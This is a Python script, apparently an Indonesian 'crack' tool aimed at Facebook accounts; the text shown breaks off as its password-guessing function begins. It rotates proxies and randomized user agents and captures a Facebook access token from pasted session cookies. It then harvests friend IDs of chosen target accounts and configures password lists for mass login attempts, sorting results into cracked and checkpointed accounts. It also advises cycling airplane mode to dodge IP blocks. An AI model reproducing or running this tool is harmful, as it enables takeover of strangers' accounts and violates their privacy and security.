#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
import zlib
import subprocess
import base64

from rich import pretty
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
cepeh, sam, ugen5, redmi = [], [], [], []
ugen3=[]
ugen2=[]
ugen=[]
cepeh, sam, ugen5, redmi = [], [], [], []
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(1000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen.append(memekk)
    
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen5.append(uaku)

for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android{str(rr(8,10))}; vivo Y21 {str(rr(4,9))} Build/LMY47I.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	pf = f'{A}{B}{C}{D}'
	if pf in redmi:pass
	else:redmi.append(pf)
	A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
	B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
	C = f'10.9.2.{str(rr(111,999))} U3/0.0 Mobile Safari/534.30'
	mi = f'{A}{B}{C}'
	if mi in redmi:pass
	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; U; Android 8; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.22.7.36.1'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid= [],[],0,0,0,[],[],[],[],[],[]
cokbrut=[]
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#--------------------[ MENU-AWAL ]--------------#
cetak(panel(f"""[bold green]GUNAKAN SCRIPT INI SEBAIK DAN SEWAJAR MUNGKIN,ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI,TERIMA KASIH[/]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]PESAN [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
tree = Tree(f" [[cyan]![/]] [bold green]TUNGGU BEBERAPA SAAT UNTUK MASUK KE DALAM MENU")
cetak(tree)
time.sleep(4)
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
        os.system('clear')
#BANNER
def banner():
	clear()
def back():
	menu()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	cetak(panel(f"""\t[red]╔═══╦══╦═╗╔═╦═══╦╗──╔═══╗╔═══╦═══╦══╗╔═══╦═══╦═╗─╔╗
\t[red]║╔═╗╠╣╠╣║╚╝║║╔═╗║║──║╔══╝║╔═╗║╔══╣╔╗║║╔═╗║╔═╗║║╚╗║║
\t[red]║╚══╗║║║╔╗╔╗║╚═╝║║──║╚══╗║╚═╝║╚══╣╚╝╚╣║─║║╚═╝║╔╗╚╝║
\t[white]╚══╗║║║║║║║║║╔══╣║─╔╣╔══╝║╔╗╔╣╔══╣╔═╗║║─║║╔╗╔╣║╚╗║║
\t[white]║╚═╝╠╣╠╣║║║║║║──║╚═╝║╚══╗║║║╚╣╚══╣╚═╝║╚═╝║║║╚╣║─║║║
\t[white]╚═══╩══╩╝╚╝╚╩╝──╚═══╩═══╝╚╝╚═╩═══╩═══╩═══╩╝╚═╩╝─╚═╝                       
                    [bold white]Made By [bold red]Indonesian[cyan] Coder[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
#--------------------[ BAGIAN-MASUK ]--------------#
def linex():
	print("%s══════════════════════════════════════════════════════════════════════%s"%(P,P))
	
def Code_():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			menu(sy2,sy3,sy4)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(panel(f'     [white]Cookies Capture Extension Suggestion : [green]Cookiedough[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGIN MENU [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		asu = random.choice([h])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'{x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()

def menu(name,id,birthday):
	try:
#		keyx()
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	urut = []
	urut.append(panel(f'[cyan]Name : {name}\nId   : {id}\nTtl  : {birthday}  ',width=34,padding=(0,2),title=f"[cyan]• Information •[/]",style=f"{color_table}"))
	urut.append(panel(f'[cyan]Ip       : {ip}\nTanggal  : {tgl} {bln} {thn}\nAuthor   : my_lupine_flame',width=34,padding=(0,2),title=f"[cyan]• Information •[/]",style=f"{color_table}"))
	wa.print(Columns(urut))
	cetak(panel(f'\t             [white][bold green] Select the Script Menu',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. Crack Public\n [{b}02{x}]. Check Results Crack\n [{b}00{x}]. Exit')
	lupine = input(f'\n [{b}?{x}] Select : ')
	print('')
	if lupine in ['1']:
		dump_massal()
	elif lupine in ['2']:
		result()
	elif lupine in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{b}01{x}] Result {h}OK{x} ')
	print(f'[{b}02{x}] Result {k}CP{x} ')
	print(f'[{b}03{x}] Return	')
	kz = input(f'\n>> Choose : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {k}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({k} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Choose Correctly ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f' [{b}>{x}] Input Target Amount ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		print(f' [{b}*{x}] Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' [{b}*{x}] Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' >> unstable signal ')
			exit()
	try:
		print(f' [{b}>{x}] Total Id Collected : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f' >>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'\t            [bold green]Id Order Setting for Crack',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. Id Old To New ({M}Not Recommend{M}{x}){x} ')
	print(f' [{b}02{x}]. Id New To Old ({H}Recommended{H}{x}){x}  ')
	print(f' [{b}03{x}]. Id Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input(f' [{b}?{x}] Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')		
	cetak(panel(f'\t             [bold green] Input Metode URL Login',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]VALIDATE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. Login from {b}Marvelous{x} (slow)')
	print(f' [{b}02{x}]. Login from {b}Tinyurl{x} (fast)')
	print(f' [{b}03{x}]. Login from {b}Medium{x} (semi fast)')
	print(f' [{b}04{x}]. Login from {b}Dior{x} (Slow V2) {h}Recommended For Now{x}')	
	cetak(panel(f'[bold green]Notes: pilih metode yang dirasa cocok dengan device & kartu anda\ndengan cara dicoba 1 per 1[bold white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	hc = input(f' [{b}?{x}] Choose : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('Mobile-v2')
	else:
		method.append('mobile')
	cetak(panel(f'[bold green]jika anda menggunakan password manual maka sistem akan mendetect password yang anda input\nanda jg dapat menggunakannya password default dengan ketik [red]t[/] [bold green]pada pilihan [white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	pwplus=input(f' [{b}?{x}] Add Password Manual ({h}y{x}/{m}t{x}) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(panel('[bold white]Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		pwku=input(f' [{b}?{x}] Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	ua = input(f' [{b}?{x}] Use manual user agent ? ({h}y{x}/{m}t{x}) : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [{b}?{x}] Input your user agent : ');uadia.append(bz)
	else:uadarimu.append('uasc')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(panel(f'           [white]Results [green]OK[white] Save in : [green]OK/%s [white]'%(okc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]OK SAVE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	cetak(panel(f'           [white]Results [yellow]CP[white] Save in : [yellow]CP/%s [white]'%(cpc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]CP SAVE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	cetak(panel(f'      [bold green]Dont forget to on/off airplane mode,to avoid IP spam',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]ALERT [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]CRACK IN PROGRES [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print('')
	global prog,des
